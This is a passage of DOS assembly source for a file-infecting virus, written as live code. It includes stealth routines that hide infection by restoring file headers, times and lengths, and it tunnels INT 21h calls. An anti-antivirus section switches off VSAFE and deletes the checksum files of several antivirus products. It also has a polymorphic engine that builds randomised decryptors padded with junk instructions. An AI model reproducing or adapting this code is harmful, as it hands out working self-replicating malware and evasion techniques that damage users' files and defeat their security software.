	    mov   cx,word ptr cs:[Header+00h]
            add   cl,ch                               ;add markers M+Z
            cmp   cl,"Z"+"M"                          ;it`s an .EXE file ?
            jz    rest_all

dsf_com:            
            call  read_origheader                     ;read original header
	    
	    mov   cx,4h                               ;COM header
            call  write_origheader                    ;write original header
	
            call  res_time&lenght
	    
rest_all:
            pop   word ptr es:[di+17h]                ;restore file pointer
	    pop   word ptr es:[di+15h]                ;position
	    
            pop   ax                                  ;restore file 
	    mov   byte ptr es:[di+04h],al             ;atribute
	    
            pop   cx                                  ;restore file open
	    mov   word ptr es:[di+02h],cx             ;mode
	    
            call  res_stuff 

exit_close:
            mov   ah,3eh                              ;close file
            call  call_tun21h

exit_res24h:
            jmp   exit


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                  RETURN THE <AL> VECTOR in <ES:BX>                       ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_int:
	    push  ax
	    xor   ah,ah
	    rol   ax,1
	    rol   ax,1
	    xchg  bx,ax
	    xor   ax,ax
	    mov   es,ax
	    les   bx,dword ptr es:[bx+00h]
	    pop   ax
	      
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                  SET <AL> INTERRUPT VECTOR to <DS:DX>                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

set_int:
	    push  ax
	    push  bx
	    push  ds
	    cli
	    xor   ah,ah
	    rol   ax,1
	    rol   ax,1
	    xchg  ax,bx
	    push  ds
	    xor   ax,ax
	    mov   ds,ax
	    mov   word ptr ds:[bx+00h],dx
	    pop   word ptr ds:[bx+02h]
	    sti   
	    pop   ds  
	    pop   bx
	    pop   ax
	       
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     SAVE ALL REGISTERS IN THE STACK                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

push_all:
	    cli
	    pop word ptr cs:[ret_off]
	    pushf
	    push ax
	    push bx
	    push cx
	    push dx
	    push bp
	    push si
	    push di
	    push es
	    push ds
	    push word ptr cs:[ret_off]
	    sti
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                   RESTORE ALL REGISTERS FROM THE STACK                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

pop_all:
	    cli
	    pop word ptr cs:[ret_off]
	    pop ds
	    pop es
	    pop di
	    pop si
	    pop bp
	    pop dx
	    pop cx
	    pop bx
	    pop ax
	    popf
	    push word ptr cs:[ret_off]
	    sti
	    ret

ret_off dw 0000h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       GET SYSTEM ENVIRONMENT                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_env:            
	    mov   ah,62h                                
	    pushf                             
            call  dword ptr cs:[oldInt21h]            ;call to INT 21h
	    
	    dec   bx
	    mov   es,bx
	    mov   ax,word ptr es:[0008h]
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      CHECK INFECTION ROUTINE                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

check_infect: 
	    clc
	    
            mov  cx,word ptr es:[di+0dh]              ;time from SFT
            mov  dx,word ptr es:[di+0fh]              ;date from SFT
	    
            mov   word ptr cs:[old_time],cx           ;save file time
            mov   word ptr cs:[org_time],cx           ;save original time
            mov   word ptr cs:[old_date],dx           ;save file date
	    
            and   cx,1fh                              ;unmask second field
            and   dx,1fh                              ;unmask date field
	    xor   cx,dx                               ;are they equal?
            jnz   ret_no                              ;file infected

	   
	    stc
ret_no:     ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     RESTORE STUFF ROUTINE                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

res_stuff:  
            mov   cx,word ptr ds:[old_time]           ;restore file time
            mov   dx,word ptr ds:[old_date]           ;restore file date
	    
	    mov   ax,5700h
	    inc   ax
            call  call_tun21h
	    ret
	    
res_time&lenght:
	    
	    push  ax
            sub   ax,06h                              ;lseek 06 bytes before
	    mov   word ptr es:[di+15h],ax             ;end
	    
	    mov   ah,3fh
            mov   cx,2                                ;read original TIME  
            mov   dx,offset ds:[old_Time]             ;save it 
            call  call_tun21h
	    
            pop   ax                                  ;file length
            sub   ax,size_sb                          ;sub virus size
            mov   word ptr es:[di+15h],ax             ;lseek to end of 
	    mov   ah,3fh                              ;real file
	    inc   ah
	    xor   cx,cx
            call  call_tun21h                         ;remove the virus

	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                  READ/WRITE ORIGINAL HEADER ROUTINE                      ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

read_origheader:            
	    
            mov   ax,word ptr es:[di+11h]             ;get filesize
            sub   ax,04h                              ;lseek 04 bytes before
	    mov   word ptr es:[di+15h],ax             ;end
	    
	    mov   ah,3fh
            mov   cx,04h                              ;read original header
            lea   dx,header             
            call  call_tun21h
	    
            call  lseek_start
	    
	    ret

write_origheader:
	    
            mov   ah,3fh                              ;write original
            inc   ah                                  ;header
            lea   dx,header             
            call  call_tun21h
	    
            call  lseek_end
	    
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      GET 16 BITS KEY ROUTINE                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_key16:  
            in    ax,40h                              ;get encryption Key
            or    ax,ax
            jnz   key_ok                              ;AX=0 ?
            inc   ax                                  ;never XOR by 0.
	    
key_ok:     
            mov   word ptr cs:[clave],ax              ;save key
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                          LSEEK ROUTINES                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

lseek_start:
            mov   word ptr es:[di+15h],00h            ;lseek to Start
	    ret
lseek_end:            
            mov   ax,word ptr es:[di+11h]             ;file length
            mov   word ptr es:[di+15h],ax             ;lseek to end 
	    ret
lseek_dos:
            mov   ah,42h                              ;lseek using DOS
            xor   cx,cx
            xor   dx,dx                               ;cwd ? .. no yet
            call  call_tun21h
            ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                          GET SFT ROUTINE                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

get_sft:    
            push  bx                                  ;save file handle             
            mov   ax,1220h                            ;get the job file table       
	    int   2fh                                 ;(JFT)                        
									      
            mov   ax,1216h                            ;get system file table
	    mov   bl,es:[di]                          ;system file table entry 
	    int   2fh                                 ;(LIST) number                      
            pop   bx                                  ;restore the handle                   
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     CALL INT21H TUNNEL ROUTINE                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

call_tun21h:   
	    pushf
            call  dword ptr cs:[tunnel21h]            ;call FAKE to int 21h   
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      SET NEW INT24h ROUTINE                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

set_int24h:
	    call  push_all

	    push  cs
	    pop   ds
	    
            mov   al,24h                              ;get int24h
	    call  get_int
	    
            mov   word ptr ds:[oldInt24h],bx          ;save it
            mov   word ptr ds:[oldInt24h+02h],es
            mov   dx,offset newint24h                 ;redirect to a dummy
	    call  set_int                             ;routine ;)

	    call  pop_all
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                 ENABLE/DISABLE KEYBOARD ROUTINE                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

disable_kb:
            push  ax
            in    al,21h
            or    al,00000010b
            out   21h,al                              ;disable keyboard
            pop   ax
            int   03h
            ret

enable_kb:
	    push  ax
            in    al,21h                              ;enable keyboard
	    and   al,not 2
	    out   21h,al
	    pop   ax
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       FUCK VSAFE ANTIVIRUS                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

vsafe_off:
	    push  bx cx dx

            mov   ax,0fa02h                           ;turn off VSAFE's flags
	    mov   dx,5945h                   
            mov   bl,00000000b                        ;new flags :-)
	    int   21h
            mov   byte ptr cs:[vshit],cl              ;save flags.
	    
	    pop   dx cx bx 

	    ret

vsafe_on:        
	    push  bx cx dx
	    
	    mov   ax,0fa02h                   
            mov   dx,5945h                            ;restore VSAFE's flags
            mov   bl,byte ptr cs:[vshit]
            and   bl,11111011b                        ;turn off write-protected 
	    int   21h                                 ;flag (cache stuff)
	    
	    pop   dx cx bx 

	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                         DELETE CRC FILES                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

delete_crc:
            pop   ax                                  ;restore :)
	    pop   si

	    call  push_all
            call  set_int24h
            call  vsafe_off
	    
	    push  cs
	    pop   ds

	    xor   cx,cx

            lea   dx,kill_msav                        ;chklist.ms
	    call  kill_crc_files
	       
	    lea   dx,kill_tbav
	    call  kill_crc_files

            lea   dx,kill_smartchk                    ;smartchk.cps
	    call  kill_crc_files

            lea   dx,kill_avp                         ;avp.crc
	    call  kill_crc_files

            lea   dx,kill_ivb                         ;ivb.ntz
	    call  kill_crc_files                  
						 
            lea   dx,kill_chklist                     ;chklist.tav
	    call  kill_crc_files

exit_delete:   
            call  vsafe_on
	    
            lds   dx,dword ptr ds:[oldInt24h]         ;restore old int24h 
	    mov   al,24h                              
	    call  set_int

            call  pop_all
	    
            jmp   exitint21h

kill_crc_files: 
            mov   ax,4300h                            ;clear Atributes
	    inc   ax
            call  call_tun21h

            mov   ah,41h                              ;delete File
            call  call_tun21h
	    retn

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                          NEW INTERRUPT 24h                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

newint24h:     
            mov   al,3h                               ;pass the error code
irett:      iret

oldint24h   dw    ?,?                                 ;original int 24h


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     DATA ABOUT ANTI-ANTIVIRUS                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


; CRC files to delete!  

kill_tbav      db      'ANTI-VIR.DAT',0
kill_msav      db      'CHKLIST.MS',0
kill_smartchk  db      'SMARTCHK.CPS',0
kill_avp       db      'AVP.CRC',0
kill_ivb       db      'IVB.NTZ',0
kill_chklist   db      'CHKLIST.TAV',0


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                        POLYMORPHIC ENGINE                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

              db 'For those about to rock ... I salute you!'

polymorphic:
            xor   ax,ax
            mov   byte ptr cs:[sw_loop],al            ;initialize engine
            mov   byte ptr cs:[sw_trash1],al
            mov   byte ptr cs:[sw_trash2],al
            mov   byte ptr es:[sw_antidb],al
            mov   byte ptr es:[cx_first],al


            cld
            mov   di,offset POLY_DECRYPTOR            ;DI=our buffer
            mov   cx,88h                              ;fill with one-byte
            call  gen_one_byte                        ;trash
	    
gen_decryptor: 
            mov   di,offset POLY_DECRYPTOR            ;our buffer
            call  make_trash
            call  make_trash
            call  make_trash

gen_first_bloq:
	    call  gen_rnd
	    and   al,01h
            jnz   gen_lea

            call  gen_mov_CX                          ;if AX=1
            mov   byte ptr cs:[cx_first],1h
	       
            call  make_trash
            call  make_trash

gen_lea:
            mov   ax,2h                               ;randon number
            call  gen_rnd_range                       ;between 0-1

	    cmp   ax,0h
            je    gen_lea_BX
	    cmp   ax,1h
            je    gen_lea_SI

gen_lea_di:
            mov   word ptr es:[DI],0BE8Dh             ;gen LEA DI,[XXXX]
	    inc   di
	    inc   di
            mov   byte ptr cs:[index],1h              ;INDEX=DI
            jmp   gen_Lea_Address
	       
gen_lea_si:                           
            mov   word ptr es:[DI],0368Dh             ;gen LEA SI,[XXXX]
	    inc   di
	    inc   di
            mov   byte ptr cs:[index],2h              ;INDEX=SI
            jmp   gen_Lea_Address

gen_lea_bx:                           
            mov   word ptr es:[DI],01E8Dh             ;gen LEA BX,[XXXX]
	    inc   di
	    inc   di
            mov   byte ptr cs:[index],3h              ;INDEX=BX

gen_lea_address:
            mov   ax,word ptr cs:[delta_ofs]
            add   ax,offset Crypt_Start               ;encrypted code :)
                                                      ;bytes to skipt
	    stosw
            
            call  make_trash
	    
cmp_mov_cx:
            cmp   byte ptr cs:[cx_first],1h
            je    gen_PUSH_Reg
	    
	    call  gen_rnd
	    and   al,01h
            jnz   gen_PUSH_reg

            call  gen_MOV_CX
            mov   byte ptr cs:[cx_first],2h
            call  make_trash

gen_push_reg:
            cmp   byte ptr cs:[index],3h
            je    gen_PUSH_BX
            cmp   byte ptr cs:[index],2h
            je    gen_PUSH_SI

gen_push_di:
	    mov   byte ptr es:[DI],57h                ;PUSH DI
	    inc   di   
	    jmp   cmp_mov_CX2 

gen_push_si:
	    mov   byte ptr es:[DI],56h                ;PUSH SI
	    inc   di   
	    jmp   cmp_mov_CX2 

gen_push_bx:
	    mov   byte ptr es:[DI],53h                ;PUSH BX            
	    inc   di   

cmp_mov_cx2:
            call  make_trash
            cmp   byte ptr cs:[cx_first],2h
            jz    gen_Math_Ins

            call  gen_MOV_CX
            mov   byte ptr cs:[cx_first],2h

gen_math_ins:               
            call  make_trash
            mov   word ptr cs:[address_loop],di       ;loop here :)
            mov   byte ptr cs:[sw_loop],1h            ;no more ints or jumps!
            
            call  make_trash

            cmp   [type_enc],0h                       ;XOR?
            je    gen_XOR_Decrypt
            cmp   [type_enc],1h                       ;ADD?
            je    gen_SUB_Decrypt
            cmp   [type_enc],2h                       ;SUB?
            je    gen_ADD_Decrypt

gen_xor_decrypt:
            mov   word ptr es:[DI],812Eh              ;XOR WORD PTR CS:
	    inc   di
	    inc   di

            cmp   byte ptr cs:[index],3h
            je    gen_XOR_INDEX_BX
            cmp   byte ptr cs:[index],2h
            je    gen_XOR_INDEX_SI

gen_xor_index_di:
	    mov   byte ptr es:[DI],35h                ;[DI]
	    inc   di
            jmp   gen_Key

gen_xor_index_si:
	    mov   byte ptr es:[DI],34h                ;[SI]
	    inc   di
            jmp   gen_Key

gen_xor_index_bx:
	    mov   byte ptr es:[DI],37h                ;[BX]
	    inc   di
            jmp   gen_Key

gen_sub_decrypt:
            mov   word ptr es:[DI],812Eh              ;SUB WORD PTR CS:
	    inc   di
	    inc   di

            cmp   byte ptr cs:[index],3h
            je    gen_SUB_INDEX_BX
            cmp   byte ptr cs:[index],2h
            je    gen_SUB_INDEX_SI

gen_sub_index_di:
            mov   byte ptr es:[DI],2Dh                ;[DI]
	    inc   di
            jmp   gen_Key

gen_sub_index_si:
            mov   byte ptr es:[DI],2Ch                ;[SI]
	    inc   di
            jmp   gen_Key

gen_sub_index_bx:
            mov   byte ptr es:[DI],2Fh                ;[BX]
	    inc   di
            jmp   gen_Key

gen_add_decrypt:
            mov   word ptr es:[DI],812Eh              ;ADD WORD PTR CS:
	    inc   di
	    inc   di

            cmp   byte ptr cs:[index],3h
            je    gen_ADD_INDEX_BX
            cmp   byte ptr cs:[index],2h
            je    gen_ADD_INDEX_SI

gen_add_index_di:
            mov   byte ptr es:[DI],05h                ;[DI]
	    inc   di
            jmp   gen_Key

gen_add_index_si:
            mov   byte ptr es:[DI],04h                ;[SI]
	    inc   di
            jmp   gen_Key

gen_add_index_bx:
            mov   byte ptr es:[DI],07h                ;[BX]
	    inc   di

gen_key:
            mov   ax,word ptr cs:[Clave]              ;move the decryption 
            stosw                                     ;key

gen_inc:
            call  make_trash
	    
	    mov   ax,2h
            call  gen_Rnd_Range
	    or    ax,ax
            jz    gen_INC_reg                         ;gen INC reg INC reg
	    cmp   ax,1h
            jz    gen_ADD_reg                         ;gen ADD reg,2
	    cmp   ax,2h
            jz    gen_SUB_reg                         ;gen SUB reg,-2

gen_inc_reg:
            call  gen_INCS                            ;gen INC (SI/DI/BX)
            call  make_trash

            call  gen_INCS                            ;gen INC (SI/DI/BX)
            call  make_trash
            jmp   gen_LOOP

gen_add_reg:
            call  gen_ADD                             ;gen ADD index,
	    mov   byte ptr es:[DI],02h                ;+2 
            inc   di                                  ;gen INC (SI/DI/BX)
            call  make_trash
            jmp   gen_LOOP

gen_sub_reg:
            call  gen_SUBFFFE
            call  make_trash

gen_loop:      
	    mov   ax,2h
            call  gen_Rnd_Range

	    or    ax,ax
            je    gen_JNZ

            call  make_trash

            mov   al,0E2h                             ;gen LOOP
	    stosb
            jmp   gen_Address

gen_jnz:                                             
            mov   al,049h                             ;gen DEC CX   
	    stosb
	    
            mov   byte ptr cs:[sw_Trash2],1h          ;no more 2 bytes trash
            mov   byte ptr cs:[sw_Trash1],1h          ;no INC/DEC here !
	    
            call  make_trash
	       
            mov   al,075h                             ;gen JNZ 
	    stosb

gen_address:
	    mov   ax,word ptr cs:[address_loop]
	    sub   ax,di
	    dec   ax
	    stosb

            call  make_trash
            call  make_trash
	       
poly_ret:      
            mov   al,0c3h                             ;gen RET
	    stosb
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³         GENERATE  MOV CX,virus_size , INC/ADD/SUBFFFE index              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_mov_cx:
            call  make_trash
	    
	    mov   ax,2
	    call  gen_rnd_range
	    or    ax,ax
            jz    gen_MOV_CX_1
	    cmp   ax,1h
            jz    gen_MOV_CX_2
	    cmp   ax,2h
            jz    gen_MOV_CX_3

	       
gen_mov_cx_1:
	    mov   byte ptr es:[DI],0B9h               ;MOV CX,xxxx
	    inc   di
            mov   ax,Size_SB                          ;move virus size
	    stosw
	    ret

gen_mov_cx_2:
	    mov   byte ptr es:[DI],0B9h               ;MOV CX,xxxx
	    inc   di
            mov   ax,Size_SB                          ;random value
            call  gen_Rnd_Range                       ;between 0-Size_SB
	    stosw
	    push  ax

            call  make_trash
	    
	    pop   ax
	    mov   word ptr es:[DI],0C181h             ;ADD CX,xxxx
	    inc   di
	    inc   di
	    mov   bx,ax
	    mov   ax,Size_SB
	    sub   ax,bx
	    stosw
	    ret

gen_mov_cx_3:
	    mov   byte ptr es:[DI],0B8h               ;MOV AX,xxxx
	    inc   di
            mov   ax,Size_SB                          ;random value
            call  gen_Rnd_Range                       ;between 0-Size_SB
	    stosw
	    push  ax

            mov   byte ptr cs:[sw_Trash1],1h          ;no INC or DEC here !
            call  make_trash
            mov   byte ptr cs:[sw_Trash1],0h          ;restore it !        
	    
	    pop   ax
	    mov   byte ptr es:[DI],05h                ;ADD AX,xxxx
	    inc   di
	    mov   bx,ax
	    mov   ax,Size_SB
	    sub   ax,bx
	    stosw
	    mov   ax,03h
            call  gen_Rnd_Range
	    mov   cx,ax
            mov   byte ptr cs:[sw_trash1],1h          ;no INC or DEC here !
            call  gen_One_Byte
            mov   byte ptr cs:[sw_trash1],0h          ;restore it !        
	    
	    mov   word ptr es:[DI],0C189h             ;MOV CX,AX
	    inc   di
	    inc   di
	    ret

gen_incs:
            cmp   byte ptr cs:[index],3h
            je    gen_INC_BX
            cmp   byte ptr cs:[index],2h
            je    gen_INC_SI
	       
gen_inc_di:
	    mov   byte ptr es:[DI],47h                ;INC DI
	    inc   di
	    ret

gen_inc_si:
	    mov   byte ptr es:[DI],46h                ;INC SI
	    inc   di
	    ret

gen_inc_bx:
	    mov   byte ptr es:[DI],43h                ;INC BX
	    inc   di
	    ret

gen_add: 
            cmp   byte ptr cs:[index],3h
	    je    Gen_ADD_BX
            cmp   byte ptr cs:[index],2h
	    je    Gen_ADD_SI
	       
gen_add_di:
	    mov   word ptr es:[DI],0C783h             ;ADD DI
	    inc   di
	    inc   di
	    ret

gen_add_si:
	    mov   word ptr es:[DI],0C683h             ;ADD SI
	    inc   di
	    inc   di
	    ret

gen_add_bx:
	    mov   word ptr es:[DI],0C383h             ;ADD BX
	    inc   di
	    inc   di
	    ret

